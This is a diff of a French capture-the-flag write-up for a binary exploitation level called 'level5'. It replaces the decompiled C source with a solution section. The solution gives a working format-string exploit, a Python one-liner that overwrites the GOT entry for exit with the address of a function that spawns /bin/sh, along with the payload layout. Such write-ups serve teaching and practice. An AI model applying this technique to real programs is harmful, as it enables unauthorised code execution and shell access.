@@ -1,26 +1,12 @@
-Code source :
+# Solution : 
 
-void o(void) {
-  system("/bin/sh");
-                    /* WARNING: Subroutine does not return */
-  _exit(1);
-}
+```
+(python -c 'print("\x38\x98\x04\x08" + "%134513824x" + "%4$n")'; cat) | ./level5
+```
 
-void n(void) {
-  char local_20c [520];
-  
-  fgets(local_20c,0x200,stdin);
-  printf(local_20c);
-                    /* WARNING: Subroutine does not return */
-  exit(1);
-}
+## Explication du level
 
-void main(void) {
-  n();
-  return;
-}
-
-Solution : 
+Ici le niveau est le meme que les precedent sauf que au lieu d'utiliser un printf format exploit, pour ecrire dans une variable ou autre on va directment overwrite l'adresse d'une fonction de la libc , "exit" son adresse se situe dans la global offset table (GOT).
 
 ------------------------------------------------------------------------------------------------
 Adresse de o :
@@ -79,11 +65,14 @@ En decimal      : 134513828
 
 ------------------------------------------------------------------------------------------------
 
-On cree notre padding :
+## Payload
+On cree notre payload :
 
 Offset : 4
 Adresse de o : 0x80484a4 || 134513828
 Adresse de exit dans la GOT : 0x8049838
+
+[Adress de exit dans la got] + [Padding pour overwrite a l'adresse de o] + [Argument que l'on veut overwrite]
 
 (python -c 'print("\x38\x98\x04\x08" + "%134513824x" + "%4$n")'; cat) | ./level5
 
